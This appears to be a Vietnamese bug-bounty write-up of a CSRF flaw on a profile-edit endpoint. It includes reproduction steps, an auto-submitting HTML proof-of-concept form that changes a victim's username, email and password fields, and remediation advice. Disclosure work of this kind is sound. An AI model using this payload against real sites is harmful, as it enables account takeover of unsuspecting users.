https://hackerone.com/reports/2699029

---

💥 **Lỗ hổng**: CSRF (Cross-Site Request Forgery) tại endpoint `/account/profile/edit`

📌 **Kết quả**: **Chiếm đoạt tài khoản** bằng cách gửi request giả mạo thay đổi thông tin người dùng **mà không cần xác thực phiên** (auth bypass).

---

### 🧠 **Quá trình khai thác (Reproduce):**

1. **Tạo tài khoản mới tại**: `https://target/account/register`

   * Bỏ qua xác minh email.
   * Đăng nhập bằng user/pass vừa tạo.

2. **Gửi POST request tới**: `https://target/account/profile/edit`

   * Payload chỉnh sửa thông tin tài khoản: username, email, password...

3. **Burp Suite chứng minh không có token CSRF** hoặc bất kỳ cơ chế xác minh nào (Origin/Referer header cũng có thể bị thiếu hoặc không check).

---

### 🧪 **PoC (Proof of Concept):**

```html
<html>
  <body>
    <form action="https://target/account/profile/edit" method="POST">
      <input type="hidden" name="username" value="hacker" />
      <input type="hidden" name="email" value="mojejas248@esterace.com" />
      <input type="hidden" name="password" value="" />
      <input type="hidden" name="cpassword" value="" />
      <input type="hidden" name="save" value="Lưu" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

💣 **Khi victim truy cập trang độc hại**, script tự động gửi form —> cập nhật thông tin tài khoản **trong session của họ**.

---

### 🔐 **Khuyến nghị khắc phục:**

* Bắt buộc sử dụng CSRF Token (dạng `hidden field + cookie binding`).
* Kiểm tra header `Origin` và `Referer` tại phía server.
* Không cho phép thay đổi thông tin nhạy cảm (email, password...) nếu chưa xác minh lại mật khẩu.
* Xác minh tài khoản (email/OTP) trước khi cho phép truy cập chỉnh sửa.

---

